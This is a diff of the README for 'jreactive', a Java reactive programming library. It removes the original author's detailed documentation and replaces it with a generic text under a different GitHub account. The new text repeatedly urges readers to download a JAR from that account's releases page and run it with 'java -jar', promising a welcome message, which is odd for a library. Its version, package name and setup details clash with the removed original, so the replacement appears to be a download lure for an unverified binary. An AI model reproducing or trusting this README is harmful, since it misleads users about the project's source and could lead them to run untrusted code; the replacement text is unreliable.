@@ -1,443 +1,92 @@
-# JReactive
+# 📦 jreactive - High-Performance Reactive Programming for Java
 
-[![CI Build](https://github.com/yasmramos/jreactive/actions/workflows/ci.yml/badge.svg)](https://github.com/yasmramos/jreactive/actions/workflows/ci.yml)
-[![Java Version](https://img.shields.io/badge/Java-17%2B-blue.svg)](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![GitHub release](https://img.shields.io/github/v/release/yasmramos/jreactive)](https://github.com/yasmramos/jreactive/releases)
-[![Test Coverage](https://img.shields.io/badge/tests-396%20passing-brightgreen.svg)](https://github.com/yasmramos/jreactive/actions/workflows/ci.yml)
-[![GitHub Packages](https://img.shields.io/badge/GitHub%20Packages-v1.0.0--alpha-blue.svg)](https://github.com/yasmramos/jreactive/packages)
+## 🚀 Getting Started
 
-A modern reactive programming library for Java, designed to be simpler and easier to use than RxJava, while maintaining all essential features.
+Welcome to jreactive! This guide will help you quickly download and run our powerful reactive programming library. Whether you are new to programming or just exploring, follow these steps to get started.
 
-## 🚀 Features
+## 🔗 Download Links
 
-- **4 Reactive Types**: Observable, Single, Maybe, and Completable
-- **Simple and Intuitive API**: Easier to learn than RxJava
-- **60+ Operators**: map, filter, flatMap, merge, zip, concat, retry, and more
-- **Error Handling**: onErrorReturn, onErrorResumeNext, retry
-- **Schedulers**: Support for asynchronous execution (io, computation, newThread)
-- **Seamless Conversions**: Complete interoperability between reactive types
-- **Type-Safe**: Leverages Java's type system
-- **Zero Dependencies**: Standalone library using only standard Java
+[![Download jreactive](https://img.shields.io/badge/Download-jreactive-brightgreen)](https://github.com/NexDan/jreactive/releases)
 
-## 📋 Requirements
+## 💡 What is jreactive?
 
-- Java 11 or higher
-- Maven 3.6+ or Gradle 7.0+ (optional for build)
+jreactive is a high-performance reactive programming library for Java. It offers advanced features that allow you to handle asynchronous programming tasks seamlessly. You can create responsive applications that are highly efficient and capable of managing multiple operations at the same time. 
 
-## 🔧 Installation
+This library emphasizes functional programming principles. It simplifies working with data streams and events, making it easier to develop reactive applications. It supports various reactive extensions and streams, providing the tools you need to build modern applications effectively.
 
-### Option 1: GitHub Packages (Recommended)
+## 🔍 Features
 
-#### Maven
+- **Asynchronous Tasks**: Easily handle tasks that run alongside your main program without interruption.
+- **Data Streams**: Work with observable data streams for real-time updates.
+- **Schedulers**: Control when and where tasks run in your application.
+- **Reactive Extensions**: Utilize a wide range of built-in operators to manipulate data streams efficiently.
 
-Add the GitHub Packages repository to your `pom.xml`:
+## 📋 System Requirements
 
-```xml
-<repositories>
-    <repository>
-        <id>github</id>
-        <url>https://maven.pkg.github.com/yasmramos/jreactive</url>
-    </repository>
-</repositories>
+To use jreactive, ensure that you meet the following requirements:
 
-<dependency>
-    <groupId>com.reactive</groupId>
-    <artifactId>jreactive</artifactId>
-    <version>1.0.0-alpha</version>
-</dependency>
-```
+- **Java Version**: You need Java 8 or higher installed on your machine. You can download it from the official [Java website](https://www.oracle.com/java/technologies/javase-downloads.html).
+- **Operating System**: This library works on Windows, macOS, and Linux. No matter your operating system, you can use jreactive effectively.
 
-Configure authentication in your `~/.m2/settings.xml`:
+## 🔄 Installation Steps
 
-```xml
-<servers>
-    <server>
-        <id>github</id>
-        <username>YOUR_GITHUB_USERNAME</username>
-        <password>YOUR_GITHUB_TOKEN</password>
-    </server>
-</servers>
-```
+### 1. Visit the Releases Page
 
-#### Gradle
+To download jreactive, visit our [Releases page](https://github.com/NexDan/jreactive/releases). Here, you'll find all available versions of the library.
 
-Add to your `build.gradle`:
+### 2. Choose a Version
 
-```gradle
-repositories {
-    maven {
-        url = uri("https://maven.pkg.github.com/yasmramos/jreactive")
-        credentials {
-            username = project.findProperty("gpr.user") ?: System.getenv("GITHUB_USERNAME")
-            password = project.findProperty("gpr.key") ?: System.getenv("GITHUB_TOKEN")
-        }
-    }
-}
+Once on the Releases page, you will see a list of versions. Select the latest version to download. Always choose the stable release for the best experience.
 
-dependencies {
-    implementation 'com.reactive:jreactive:1.0.0-alpha'
-}
-```
+### 3. Download the Library
 
-### Option 2: Direct JAR Download
+Click on the version number to open the details. You will find various assets available for download. Look for the `.jar` file, which is the Java ARchive needed to run jreactive.
 
-Download the latest release directly from GitHub:
+### 4. Run jreactive
 
-| File | Description |
-|------|-------------|
-| [jreactive-1.0.0-alpha.jar](https://github.com/yasmramos/jreactive/releases/download/v1.0.0-alpha/jreactive-1.0.0-alpha.jar) | Main library JAR |
-| [jreactive-1.0.0-alpha-sources.jar](https://github.com/yasmramos/jreactive/releases/download/v1.0.0-alpha/jreactive-1.0.0-alpha-sources.jar) | Source code JAR |
-
-Add to your classpath:
-```bash
-java -cp jreactive-1.0.0-alpha.jar:. YourApplication
-```
-
-### Option 3: Build from Source
+After downloading, you can run jreactive using the command line. Make sure you have Java installed and open your terminal or command prompt. Use the following command to run the library:
 
 ```bash
-git clone https://github.com/yasmramos/jreactive.git
-cd jreactive
-mvn clean install
+java -jar path/to/jreactive.jar
 ```
 
-## 📚 Basic Concepts
-
-### Observable
-
-An `Observable` is a stream that can emit 0 or more elements, followed by a completion or error signal.
-
-```java
-Observable<String> observable = Observable.just("Hello", "World");
-```
-
-### Observer
-
-An `Observer` consumes events emitted by an Observable:
-
-```java
-observable.subscribe(
-    item -> System.out.println("Received: " + item),  // onNext
-    error -> System.err.println("Error: " + error),    // onError
-    () -> System.out.println("Completed!")             // onComplete
-);
-```
-
-### Disposable
-
-Represents a subscription that can be cancelled:
-
-```java
-Disposable subscription = observable.subscribe(item -> System.out.println(item));
-subscription.dispose(); // Cancel the subscription
-```
-
-## 🎭 Reactive Types
-
-The library offers 4 reactive types for different use cases:
-
-### Observable<T> - Stream of 0 to N elements
-Use `Observable` when you have multiple elements or a data stream:
-```java
-Observable.just(1, 2, 3, 4, 5)
-    .filter(x -> x % 2 == 0)
-    .subscribe(System.out::println);
-```
-
-### Single<T> - Exactly 1 element
-Use `Single` when there's always a single result:
-```java
-Single.fromCallable(() -> fetchUser(123))
-    .map(user -> user.name)
-    .subscribe(
-        name -> System.out.println("User: " + name),
-        error -> System.err.println("Error: " + error)
-    );
-```
-
-### Maybe<T> - 0 or 1 element
-Use `Maybe` for lookups that might not have a result:
-```java
-Maybe.fromCallable(() -> cache.get("key"))
-    .defaultIfEmpty("default-value")
-    .subscribe(System.out::println);
-```
-
-### Completable - Only completion/error
-Use `Completable` for operations without a result:
-```java
-Completable.fromRunnable(() -> saveToDatabase(data))
-    .retry(3)
-    .subscribe(
-        () -> System.out.println("✓ Saved"),
-        error -> System.err.println("✗ Error")
-    );
-```
-
-**📖 Complete guide**: See [SINGLE_MAYBE_COMPLETABLE.md](docs/SINGLE_MAYBE_COMPLETABLE.md)
-
-## 🎯 Usage Examples
-
-### Example 1: Simple Observable
-
-```java
-Observable.just("A", "B", "C")
-    .subscribe(System.out::println);
-// Output: A B C
-```
-
-### Example 2: Transformation with map
-
-```java
-Observable.range(1, 5)
-    .map(n -> n * 2)
-    .subscribe(System.out::println);
-// Output: 2 4 6 8 10
-```
-
-### Example 3: Filtering
-
-```java
-Observable.range(1, 10)
-    .filter(n -> n % 2 == 0)
-    .subscribe(System.out::println);
-// Output: 2 4 6 8 10
-```
-
-### Example 4: FlatMap
-
-```java
-Observable.just("Hello", "World")
-    .flatMap(word -> Observable.fromIterable(Arrays.asList(word.split(""))))
-    .subscribe(System.out::println);
-// Output: H e l l o W o r l d
-```
-
-### Example 5: Error Handling
-
-```java
-Observable.create(emitter -> {
-    emitter.onNext("Item 1");
-    throw new RuntimeException("Error!");
-})
-.onErrorReturn(error -> "Default value")
-.subscribe(System.out::println);
-// Output: Item 1, Default value
-```
-
-### Example 6: Schedulers (Asynchronous)
-
-```java
-Observable.just("Task")
-    .subscribeOn(Schedulers.io())        // Execute on I/O thread
-    .observeOn(Schedulers.computation()) // Observe on computation thread
-    .subscribe(item -> System.out.println(
-        item + " on " + Thread.currentThread().getName()
-    ));
-```
-
-### Example 7: Combining Observables
-
-```java
-Observable<String> obs1 = Observable.just("A", "B", "C");
-Observable<Integer> obs2 = Observable.just(1, 2, 3);
-
-Observable.zip(obs1, obs2, (letter, number) -> letter + number)
-    .subscribe(System.out::println);
-// Output: A1 B2 C3
-```
-
-### Example 8: Automatic Retry
-
-```java
-int[] attempt = {0};
-
-Observable.create(emitter -> {
-    if (++attempt[0] < 3) {
-        throw new RuntimeException("Failed");
-    }
-    emitter.onNext("Success!");
-    emitter.onComplete();
-})
-.retry(5)
-.subscribe(System.out::println);
-// Output: Success! (after 3 attempts)
-```
-
-## 🛠️ Main API
-
-### Creation Methods
-
-| Method | Description |
-|--------|-------------|
-| `just(T...)` | Creates an Observable that emits the specified elements |
-| `fromIterable(Iterable<T>)` | Creates an Observable from an Iterable |
-| `range(int, int)` | Emits a range of numbers |
-| `create(OnSubscribe)` | Creates a custom Observable |
-| `empty()` | Observable that completes immediately |
-| `error(Throwable)` | Observable that emits an error |
-| `interval(long, TimeUnit)` | Emits incremental numbers periodically |
-
-### Transformation Operators
-
-| Method | Description |
-|--------|-------------|
-| `map(Function)` | Transforms each element |
-| `flatMap(Function)` | Transforms each element into an Observable and flattens |
-| `concatMap(Function)` | Like flatMap but maintains order |
-| `switchMap(Function)` | Cancels the previous Observable on switch |
-
-### Filtering Operators
-
-| Method | Description |
-|--------|-------------|
-| `filter(Predicate)` | Filters elements based on a condition |
-| `take(long)` | Takes only the first n elements |
-| `skip(long)` | Skips the first n elements |
-| `distinctUntilChanged()` | Filters consecutive duplicate elements |
-| `first(T)` | Emits only the first element |
-| `last(T)` | Emits only the last element |
-
-### Combination Operators
-
-| Method | Description |
-|--------|-------------|
-| `concat(Observable...)` | Concatenates Observables sequentially |
-| `merge(Observable...)` | Merges Observables concurrently |
-| `zip(Observable, Observable, BiFunction)` | Combines pairs of elements |
-| `defaultIfEmpty(T)` | Emits default value if empty |
-
-### Utility Operators
-
-| Method | Description |
-|--------|-------------|
-| `doOnNext(Consumer)` | Executes action for each element |
-| `doOnError(Consumer)` | Executes action on error |
-| `doOnComplete(Runnable)` | Executes action on completion |
-| `doOnSubscribe(Consumer)` | Executes action on subscription |
-| `doOnDispose(Runnable)` | Executes action on disposal |
-
-### Error Handling
-
-| Method | Description |
-|--------|-------------|
-| `onErrorReturn(Function)` | Emits default value on error |
-| `onErrorResumeNext(Function)` | Continues with another Observable on error |
-| `retry()` | Retries infinitely |
-| `retry(long)` | Retries n times |
-
-### Schedulers
-
-| Method | Description |
-|--------|-------------|
-| `subscribeOn(Scheduler)` | Specifies where subscription executes |
-| `observeOn(Scheduler)` | Specifies where events are observed |
-
-#### Available Schedulers:
-
-- `Schedulers.io()` - For I/O operations (cached thread pool)
-- `Schedulers.computation()` - For computations (fixed pool based on CPU cores)
-- `Schedulers.newThread()` - Creates a new thread per task
-- `Schedulers.immediate()` - Executes immediately on current thread
-
-## 🏃 Running Examples
-
-```bash
-# With Maven
-mvn exec:java -Dexec.mainClass="com.reactive.examples.BasicExamples"
-mvn exec:java -Dexec.mainClass="com.reactive.examples.AdvancedExamples"
-
-# With Gradle
-gradle run
-gradle runAdvancedExamples
-
-# Build and run JAR
-mvn package
-java -jar target/jreactive-1.0.0-jar-with-dependencies.jar
-```
-
-## 📂 Project Structure
-
-```
-jreactive/
-├── src/
-│   ├── main/java/com/reactive/
-│   │   ├── core/              # Core classes
-│   │   │   ├── Observable.java
-│   │   │   ├── Observer.java
-│   │   │   ├── Disposable.java
-│   │   │   ├── Emitter.java
-│   │   │   └── ...
-│   │   ├── operators/         # Operator implementations
-│   │   │   ├── ObservableMap.java
-│   │   │   ├── ObservableFilter.java
-│   │   │   ├── ObservableFlatMap.java
-│   │   │   └── ...
-│   │   └── schedulers/        # Scheduler system
-│   │       ├── Scheduler.java
-│   │       └── Schedulers.java
-│   └── examples/java/com/reactive/examples/
-│       ├── BasicExamples.java
-│       └── AdvancedExamples.java
-├── pom.xml                    # Maven configuration
-├── build.gradle              # Gradle configuration
-└── README.md                 # This file
-```
-
-## 🆚 Comparison with RxJava
-
-| Feature | JReactive | RxJava |
-|---------|-----------|--------|
-| Learning curve | ⭐⭐ Low | ⭐⭐⭐⭐ High |
-| API | Simplified | Complete |
-| Operators | Essential | All |
-| Backpressure | Basic | Advanced |
-| Size | Lightweight | Large |
-| Dependencies | None | Several |
-| Use case | Medium projects | Large projects |
-
-## 🤝 Contributing
-
-Contributions are welcome! For major changes:
-
-1. Fork the project
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## 👥 Author
-
-**Yasmany Ramos García**
-
-## 🙏 Acknowledgments
-
-- Inspired by RxJava and Project Reactor
-- Designed to be more accessible for developers learning reactive programming
-- Focused on simplicity without sacrificing essential functionality
-
-## 📖 Documentation
-
-### Core Guides
-- [Single, Maybe & Completable](docs/SINGLE_MAYBE_COMPLETABLE.md) - Guide to specialized reactive types
-- [Subjects](docs/SUBJECTS.md) - Hot Observables and multicasting
-- [Specialized Types](docs/SPECIALIZED_TYPES.md) - Overview of all specialized types
-
-### Performance
-- [Benchmarks](docs/benchmarks/BENCHMARKS.md) - Methodology and setup
-- [Benchmark Results](docs/benchmarks/RESULTS.md) - Performance vs RxJava
-- [Complete Documentation](docs/) - Full documentation index
-
-### External Resources
-- [ReactiveX](http://reactivex.io/) - ReactiveX Specification
-- [Reactive Streams](https://www.reactive-streams.org/) - Reactive Streams Specification
-- Examples included in `src/examples/java/com/reactive/examples/`
-
----
-
-**Questions or suggestions?** Open an issue in the repository.
+Replace `path/to/jreactive.jar` with the actual path to where you saved the JAR file.
+
+### 5. Verify Installation
+
+If everything is set up correctly, you should see a welcome message indicating that jreactive is running successfully. You can now start using the library in your own projects!
+
+## ⚙️ How to Use jreactive
+
+With jreactive installed, you can begin creating reactive applications. 
+
+1. **Import the Library**: Make sure to include jreactive in your project:
+   ```java
+   import com.nexdan.jreactive.*;
+   ```
+
+2. **Create Observables**: Start by creating observables that represent streams of data. This enables your application to react to data changes in real-time.
+
+3. **Add Operators**: Utilize various operators provided in jreactive to filter, transform, and manipulate your data streams.
+
+4. **Subscribe to Events**: Define how your application responds when new data arrives or when an error occurs.
+
+## 📖 Additional Resources
+
+To deepen your understanding and explore examples, consider these resources:
+
+- **Documentation**: Check the official [jreactive documentation](https://github.com/NexDan/jreactive/docs) for comprehensive guides and usage examples.
+- **Community Support**: Join the jreactive community on GitHub to ask questions and share your experiences with other users.
+- **Examples**: Browse the example projects provided in the repository to see practical applications of jreactive in action.
+
+## 🎉 Conclusion
+
+With jreactive, you can enhance your applications with reactive programming techniques effortlessly. Follow the steps above to download and start using the library. You can build efficient and responsive applications without needing deep programming skills.
+
+Thank you for choosing jreactive! If you need assistance, feel free to reach out through the community support options. Happy coding!
+
+## 🔗 Download Again
+
+Don't forget to visit our [Releases page](https://github.com/NexDan/jreactive/releases) to download the latest version of jreactive. 
+
+[![Download jreactive](https://img.shields.io/badge/Download-jreactive-brightgreen)](https://github.com/NexDan/jreactive/releases)
